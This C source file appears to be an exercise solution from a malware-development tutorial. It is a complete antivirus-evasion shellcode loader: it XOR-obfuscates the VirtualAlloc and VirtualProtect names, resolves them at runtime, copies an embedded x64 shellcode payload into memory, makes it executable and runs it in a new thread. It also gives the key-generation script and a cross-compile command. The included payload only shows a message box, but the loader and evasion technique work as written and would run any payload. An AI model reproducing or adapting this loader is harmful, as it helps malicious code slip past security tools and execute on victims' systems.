/*
 * exercise 2 solution
 * AV evasion: obfuscate VirtualAlloc AND VirtualProtect via XOR
 * hack2.c
 * author: @cocomelonc
 *
 * base: 02-func-call-obfuscation/hack2.c
 *   - that file only obfuscates VirtualAlloc
 *   - this file also obfuscates VirtualProtect
 *
 * technique:
 *   store the API name as an XOR-encrypted byte array, decrypt at
 *   runtime, resolve via GetProcAddress, and call through a typed
 *   function pointer - so the import table and string table never
 *   contain the plain-text name.
 *
 * how cVirtualProtect was generated (key = "secret123"):
 *   python3 -c "
 *   def xenc(s, key):
 *       d = list(s.encode() + b'\x00')
 *       keyb = key.encode(); kl = len(keyb)+1; ki = 0
 *       r = []
 *       for b in d:
 *           if ki == kl-1: ki = 0
 *           r.append(b ^ keyb[ki]); ki += 1
 *       return r
 *   print(xenc('VirtualProtect','secret123'))
 *   "
 *   => { 0x25, 0x0c, 0x11, 0x06, 0x10, 0x15, 0x5d, 0x62, 0x41, 0x1c,
 *        0x11, 0x06, 0x11, 0x11, 0x74 }   (14 chars + null = 15 bytes)
 *
 * compile (cross-compile from Linux):
 * x86_64-w64-mingw32-gcc hack2.c -o hack2.exe -I/usr/share/mingw-w64/include/ -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc
 */
#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

/* ── function pointer types ───────────────────────────────────────────── */

// original: from hack2.c
LPVOID (WINAPI * pVirtualAlloc)(LPVOID, SIZE_T, DWORD, DWORD);

/*
 * exercise 2 addition: function pointer type for VirtualProtect.
 * BOOL WINAPI VirtualProtect(LPVOID, SIZE_T, DWORD, PDWORD);
 */
BOOL (WINAPI * pVirtualProtect)(LPVOID, SIZE_T, DWORD, PDWORD);

/* ── MessageBox payload (plain, not the focus of this exercise) ───────── */
unsigned char payload[] =
  "\x48\x83\xEC\x28\x48\x83\xE4\xF0\x48\x8D\x15\x66\x00\x00\x00"
  "\x48\x8D\x0D\x52\x00\x00\x00\xE8\x9E\x00\x00\x00\x4C\x8B\xF8"
  "\x48\x8D\x0D\x5D\x00\x00\x00\xFF\xD0\x48\x8D\x15\x5F\x00\x00"
  "\x00\x48\x8D\x0D\x4D\x00\x00\x00\xE8\x7F\x00\x00\x00\x4D\x33"
  "\xC9\x4C\x8D\x05\x61\x00\x00\x00\x48\x8D\x15\x4E\x00\x00\x00"
  "\x48\x33\xC9\xFF\xD0\x48\x8D\x15\x56\x00\x00\x00\x48\x8D\x0D"
  "\x0A\x00\x00\x00\xE8\x56\x00\x00\x00\x48\x33\xC9\xFF\xD0\x4B"
  "\x45\x52\x4E\x45\x4C\x33\x32\x2E\x44\x4C\x4C\x00\x4C\x6F\x61"
  "\x64\x4C\x69\x62\x72\x61\x72\x79\x41\x00\x55\x53\x45\x52\x33"
  "\x32\x2E\x44\x4C\x4C\x00\x4D\x65\x73\x73\x61\x67\x65\x42\x6F"
  "\x78\x41\x00\x48\x65\x6C\x6C\x6F\x20\x77\x6F\x72\x6C\x64\x00"
  "\x4D\x65\x73\x73\x61\x67\x65\x00\x45\x78\x69\x74\x50\x72\x6F"
  "\x63\x65\x73\x73\x00\x48\x83\xEC\x28\x65\x4C\x8B\x04\x25\x60"
  "\x00\x00\x00\x4D\x8B\x40\x18\x4D\x8D\x60\x10\x4D\x8B\x04\x24"
  "\xFC\x49\x8B\x78\x60\x48\x8B\xF1\xAC\x84\xC0\x74\x26\x8A\x27"
  "\x80\xFC\x61\x7C\x03\x80\xEC\x20\x3A\xE0\x75\x08\x48\xFF\xC7"
  "\x48\xFF\xC7\xEB\xE5\x4D\x8B\x00\x4D\x3B\xC4\x75\xD6\x48\x33"
  "\xC0\xE9\xA7\x00\x00\x00\x49\x8B\x58\x30\x44\x8B\x4B\x3C\x4C"
  "\x03\xCB\x49\x81\xC1\x88\x00\x00\x00\x45\x8B\x29\x4D\x85\xED"
  "\x75\x08\x48\x33\xC0\xE9\x85\x00\x00\x00\x4E\x8D\x04\x2B\x45"
  "\x8B\x71\x04\x4D\x03\xF5\x41\x8B\x48\x18\x45\x8B\x50\x20\x4C"
  "\x03\xD3\xFF\xC9\x4D\x8D\x0C\x8A\x41\x8B\x39\x48\x03\xFB\x48"
  "\x8B\xF2\xA6\x75\x08\x8A\x06\x84\xC0\x74\x09\xEB\xF5\xE2\xE6"
  "\x48\x33\xC0\xEB\x4E\x45\x8B\x48\x24\x4C\x03\xCB\x66\x41\x8B"
  "\x0C\x49\x45\x8B\x48\x1C\x4C\x03\xCB\x41\x8B\x04\x89\x49\x3B"
  "\xC5\x7C\x2F\x49\x3B\xC6\x73\x2A\x48\x8D\x34\x18\x48\x8D\x7C"
  "\x24\x30\x4C\x8B\xE7\xA4\x80\x3E\x2E\x75\xFA\xA4\xC7\x07\x44"
  "\x4C\x4C\x00\x49\x8B\xCC\x41\xFF\xD7\x49\x8B\xCC\x48\x8B\xD6"
  "\xE9\x14\xFF\xFF\xFF\x48\x03\xC3\x48\x83\xC4\x28\xC3";

/* ── XOR-encrypted API name strings ──────────────────────────────────── */

// "VirtualAlloc" encrypted with "secret123" (from original hack2.c)
unsigned char cVirtualAlloc[] = { 0x25, 0x0c, 0x11, 0x06, 0x10, 0x15, 0x5d, 0x73, 0x5f, 0x1f, 0x0a, 0x00 };

/*
 * exercise 2 addition:
 * "VirtualProtect" encrypted with key "secret123"
 * (14 chars + null terminator = 15 bytes)
 */
unsigned char cVirtualProtect[] = { 0x25, 0x0c, 0x11, 0x06, 0x10, 0x15, 0x5d, 0x62, 0x41, 0x1c, 0x11, 0x06, 0x11, 0x11, 0x74 };

char secretKey[] = "secret123";

// XOR decrypt (identical to original)
void deXOR(char *buffer, size_t bufferLength, char *key, size_t keyLength) {
  int keyIndex = 0;
  for (int i = 0; i < (int)bufferLength; i++) {
    if (keyIndex == (int)keyLength - 1) keyIndex = 0;
    buffer[i] = buffer[i] ^ key[keyIndex];
    keyIndex++;
  }
}

int main(void) {
  void *payload_mem;
  BOOL result;
  HANDLE thread_handle;
  DWORD oldprotect = 0;

  HMODULE kernel = GetModuleHandle("kernel32.dll");

  // ── resolve VirtualAlloc (original technique) ──────────────────────
  deXOR((char*)cVirtualAlloc, sizeof(cVirtualAlloc), secretKey, sizeof(secretKey));
  pVirtualAlloc = (LPVOID(WINAPI*)(LPVOID, SIZE_T, DWORD, DWORD))
                  GetProcAddress(kernel, (LPCSTR)cVirtualAlloc);

  /*
   * exercise 2 addition:
   * resolve VirtualProtect the same way.
   * after deXOR, cVirtualProtect will contain "VirtualProtect\0".
   */
  deXOR((char*)cVirtualProtect, sizeof(cVirtualProtect), secretKey, sizeof(secretKey));
  pVirtualProtect = (BOOL(WINAPI*)(LPVOID, SIZE_T, DWORD, PDWORD))
                    GetProcAddress(kernel, (LPCSTR)cVirtualProtect);

  // allocate via obfuscated pointer (original)
  payload_mem = pVirtualAlloc(0, sizeof(payload), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
  RtlMoveMemory(payload_mem, payload, sizeof(payload));

  /*
   * exercise 2 change:
   * original: result = VirtualProtect(payload_mem, ...);
   * updated:  result = pVirtualProtect(payload_mem, ...);
   * - the string "VirtualProtect" now only exists in encrypted form.
   */
  result = pVirtualProtect(payload_mem, sizeof(payload), PAGE_EXECUTE_READ, &oldprotect);
  if (result != 0) {
    thread_handle = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)payload_mem, 0, 0, 0);
    WaitForSingleObject(thread_handle, -1);
  }
  return 0;
}
